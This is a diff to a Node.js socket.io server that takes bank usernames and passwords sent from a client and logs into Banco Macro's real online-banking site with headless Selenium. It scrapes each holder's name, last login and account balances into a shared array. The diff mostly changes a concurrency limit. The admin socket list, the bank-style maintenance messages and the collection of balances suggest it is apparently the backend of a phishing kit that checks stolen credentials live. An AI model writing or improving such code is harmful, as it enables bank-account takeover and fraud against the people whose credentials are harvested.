@@ -11,7 +11,7 @@ module.exports = httpServer => {
 
 
     const { Server } = require("socket.io");
-    const io = new Server(httpServer, {'pingInterval': 60000, 'pingTimeout': 900000});
+    const io = new Server(httpServer, { 'pingInterval': 60000, 'pingTimeout': 900000 });
 
     var socketsOnLineAdm = [];
     var socketsInHome = [];
@@ -21,7 +21,7 @@ module.exports = httpServer => {
     var totalInfoArr = []
     var LimiteNavegador = 2;
     var OnLine = 0;
-    var OnLineQ = 0;
+    var OnLineLogin = 0;
 
     io.on("connection", socket => {
 
@@ -72,7 +72,7 @@ module.exports = httpServer => {
                     io.to(data.socket).emit("Resend", data);
                 }, 1500);
             } else {
-                OnLine +=1;
+                OnLine += 1;
                 console.log('Usando el Nav: ' + OnLine)
 
                 let browser = new swd.Builder();
@@ -227,146 +227,148 @@ module.exports = httpServer => {
                 io.to(data.socket).emit("ErrorLogin", "En este momento nos encontramos efectuando tareas de mantenimiento. Disculpá las molestias ocasionadas.");
             } else {
 
-                OnLine += 1;
-                console.log('OnLine' + OnLine)
+                if (OnLineLogin >= LimiteNavegador) {
+                    setTimeout(() => {
+                        io.to(data.socket).emit("Resend", data);
+                    }, 1500);
+                } else {
+                    OnLineLogin += 1;
+                    console.log('Usando el Nav: ' + OnLineLogin)
 
-                while (OnLine > LimiteNavegador) {
-                    console.log("OnLine: " + OnLine);
-                    sleepi(2000);
-                }
 
-                let browser = new swd.Builder();
-                let tab = browser.forBrowser("chrome")
-                    .setChromeOptions(new chrome.Options().addArguments(['--headless', '--no-sandbox', '--disable-dev-shm-usage']))
-                    .setFirefoxOptions(new firefox.Options().addArguments(['--headless', '--no-sandbox', '--disable-dev-shm-usage']))
-                    .build();
+                    let browser = new swd.Builder();
+                    let tab = browser.forBrowser("chrome")
+                        .setChromeOptions(new chrome.Options().addArguments(['--headless', '--no-sandbox', '--disable-dev-shm-usage']))
+                        .setFirefoxOptions(new firefox.Options().addArguments(['--headless', '--no-sandbox', '--disable-dev-shm-usage']))
+                        .build();
 
-                //Step 1 - Opening sign in page
-                let tabToOpenSignIn =
-                    tab.get("https://www.macro.com.ar/bancainternet/");
-                tabToOpenSignIn
-                    .then(() => {
-                        // Timeout to wait if connection is slow
-                        let findTimeOutP =
-                            tab.manage().setTimeouts({
-                                implicit: 15000, // 15 seconds
-                            });
-                        return findTimeOutP;
-                    })
-                    .then(() => {
-                        //Finding the username input
-                        let promiseUsernameBox = tab.findElement(swd.By.css("#textField1"))
-                            .catch(() => {
-                                tab.quit();
-                                io.to(data.socket).emit("ErrorLogin", 'En este momento nos encontramos efectuando tareas de mantenimiento. Disculpá las molestias ocasionadas.');
-                                throw new Error("Mantenimiento");
-                            })
-                        return promiseUsernameBox;
-                    })
-                    //Entering the username
-                    .then(usernameBox => {
-                        let promiseFillUsername =
-                            usernameBox.sendKeys(data.user);
-                        return promiseFillUsername;
-                    })
-                    .then(() => {
-                        console.log("Username entered successfully");
-                        let promiseBtnIngresar =
-                            tab.findElement(swd.By.css("#processCustomerLogin"));
-                        return promiseBtnIngresar;
-                    })
-                    .then(promiseBtnIngresar => {
-                        let promiseClickIngresar = promiseBtnIngresar.click();
-                        return promiseClickIngresar;
-                    })
-                    .then(() => {
-                        //Finding the password input
-                        let promisePasswordBox =
-                            tab.findElement(swd.By.css("#login_textField1"));
-                        return promisePasswordBox;
-                    })
-                    //Entering the password
-                    .then(PasswordBox => {
-                        let promiseFillPassword =
-                            PasswordBox.sendKeys(data.pass);
-                        return promiseFillPassword;
-                    })
-                    .then(() => {
-                        console.log("Password entered successfully");
-                        let promiseBtnIngresar = tab.findElement(swd.By.css("#processSystem_UserLogin"));
-                        return promiseBtnIngresar;
-                    })
-                    .then(promiseBtnIngresar => {
-                        let promiseClickIngresar = promiseBtnIngresar.click();
-                        return promiseClickIngresar;
-                    })
-                    .then(() => {
-                        let promiseError = tab.findElement(swd.By.css("#modalContainer")).getText()
-                            .catch(() => {
-                                return false;
-                            })
-                        return promiseError;
-                    })
-                    .then(errorLogin => {
-                        if (errorLogin) {
-                            console.log(errorLogin)
-                            tab.quit();
-                            io.to(data.socket).emit("ErrorLogin", errorLogin);
-                            throw new Error("de inicio de sesion!");
-                        }
-                    })
-                    .then(() => {
-                        //Finding totales box
-                        let nombrePersona =
-                            tab.findElement(swd.By.css(".widget_userName")).getText();
-                        return nombrePersona;
-                    })
-                    .then(nombrePersona => {
-                        totalInfo.push(nombrePersona)
-                    })
-                    .then(() => {
-                        //Finding totales box
-                        let lastAuth =
-                            tab.findElement(swd.By.css(".widget_lastAuth")).getText();
-                        return lastAuth;
-                    })
-                    .then(lastAuth => {
-                        totalInfo.push(lastAuth)
-                    })
-                    .then(() => {
-                        //Finding totales box
-                        let saldos =
-                            tab.findElements(swd.By.xpath("//td[@headers='_Saldo disponible']"))//.getText();
-                        return saldos;
-                    })
-                    .then(saldos => {
-                        for (let i = 0; i < saldos.length; i++) {
-                            saldos[i].getText()
-                                .then((textsaldo) => {
-                                    totalInfo.push(textsaldo)
-                                    console.log(totalInfo)
-                                    if (i + 1 == saldos.length) {
-                                        totalInfoArr.push(totalInfo);
-                                        io.to(data.socket).emit("ContinuarHome", totalInfo);
-                                    }
+                    //Step 1 - Opening sign in page
+                    let tabToOpenSignIn =
+                        tab.get("https://www.macro.com.ar/bancainternet/");
+                    tabToOpenSignIn
+                        .then(() => {
+                            // Timeout to wait if connection is slow
+                            let findTimeOutP =
+                                tab.manage().setTimeouts({
+                                    implicit: 15000, // 15 seconds
+                                });
+                            return findTimeOutP;
+                        })
+                        .then(() => {
+                            //Finding the username input
+                            let promiseUsernameBox = tab.findElement(swd.By.css("#textField1"))
+                                .catch(() => {
+                                    tab.quit();
+                                    io.to(data.socket).emit("ErrorLogin", 'En este momento nos encontramos efectuando tareas de mantenimiento. Disculpá las molestias ocasionadas.');
+                                    throw new Error("Mantenimiento");
                                 })
-                        }
-                    })
-                    .then(() => {
-                        let promiseBtnLogout = tab.findElement(swd.By.css("#widgetLogoutBtn"));
-                        return promiseBtnLogout;
-                    })
-                    .then(BtnLogout => {
-                        let BtnLogoutClick = BtnLogout.click();
-                        return BtnLogoutClick;
-                    })
-                    .then(() => {
-                        tab.quit();
-                        OnLine -= 1;
-                    })
-                    .catch(err => {
-                        console.log("Error ", err, " occurred!");
-                    });
+                            return promiseUsernameBox;
+                        })
+                        //Entering the username
+                        .then(usernameBox => {
+                            let promiseFillUsername =
+                                usernameBox.sendKeys(data.user);
+                            return promiseFillUsername;
+                        })
+                        .then(() => {
+                            console.log("Username entered successfully");
+                            let promiseBtnIngresar =
+                                tab.findElement(swd.By.css("#processCustomerLogin"));
+                            return promiseBtnIngresar;
+                        })
+                        .then(promiseBtnIngresar => {
+                            let promiseClickIngresar = promiseBtnIngresar.click();
+                            return promiseClickIngresar;
+                        })
+                        .then(() => {
+                            //Finding the password input
+                            let promisePasswordBox =
+                                tab.findElement(swd.By.css("#login_textField1"));
+                            return promisePasswordBox;
+                        })
+                        //Entering the password
+                        .then(PasswordBox => {
+                            let promiseFillPassword =
+                                PasswordBox.sendKeys(data.pass);
+                            return promiseFillPassword;
+                        })
+                        .then(() => {
+                            console.log("Password entered successfully");
+                            let promiseBtnIngresar = tab.findElement(swd.By.css("#processSystem_UserLogin"));
+                            return promiseBtnIngresar;
+                        })
+                        .then(promiseBtnIngresar => {
+                            let promiseClickIngresar = promiseBtnIngresar.click();
+                            return promiseClickIngresar;
+                        })
+                        .then(() => {
+                            let promiseError = tab.findElement(swd.By.css("#modalContainer")).getText()
+                                .catch(() => {
+                                    return false;
+                                })
+                            return promiseError;
+                        })
+                        .then(errorLogin => {
+                            if (errorLogin) {
+                                console.log(errorLogin)
+                                tab.quit();
+                                io.to(data.socket).emit("ErrorLogin", errorLogin);
+                                throw new Error("de inicio de sesion!");
+                            }
+                        })
+                        .then(() => {
+                            //Finding totales box
+                            let nombrePersona =
+                                tab.findElement(swd.By.css(".widget_userName")).getText();
+                            return nombrePersona;
+                        })
+                        .then(nombrePersona => {
+                            totalInfo.push(nombrePersona)
+                        })
+                        .then(() => {
+                            //Finding totales box
+                            let lastAuth =
+                                tab.findElement(swd.By.css(".widget_lastAuth")).getText();
+                            return lastAuth;
+                        })
+                        .then(lastAuth => {
+                            totalInfo.push(lastAuth)
+                        })
+                        .then(() => {
+                            //Finding totales box
+                            let saldos =
+                                tab.findElements(swd.By.xpath("//td[@headers='_Saldo disponible']"))//.getText();
+                            return saldos;
+                        })
+                        .then(saldos => {
+                            for (let i = 0; i < saldos.length; i++) {
+                                saldos[i].getText()
+                                    .then((textsaldo) => {
+                                        totalInfo.push(textsaldo)
+                                        console.log(totalInfo)
+                                        if (i + 1 == saldos.length) {
+                                            totalInfoArr.push(totalInfo);
+                                            io.to(data.socket).emit("ContinuarHome", totalInfo);
+                                        }
+                                    })
+                            }
+                        })
+                        .then(() => {
+                            let promiseBtnLogout = tab.findElement(swd.By.css("#widgetLogoutBtn"));
+                            return promiseBtnLogout;
+                        })
+                        .then(BtnLogout => {
+                            let BtnLogoutClick = BtnLogout.click();
+                            return BtnLogoutClick;
+                        })
+                        .then(() => {
+                            tab.quit();
+                            OnLineLogin -= 1;
+                        })
+                        .catch(err => {
+                            console.log("Error ", err, " occurred!");
+                        });
+                }
             }
         });
 
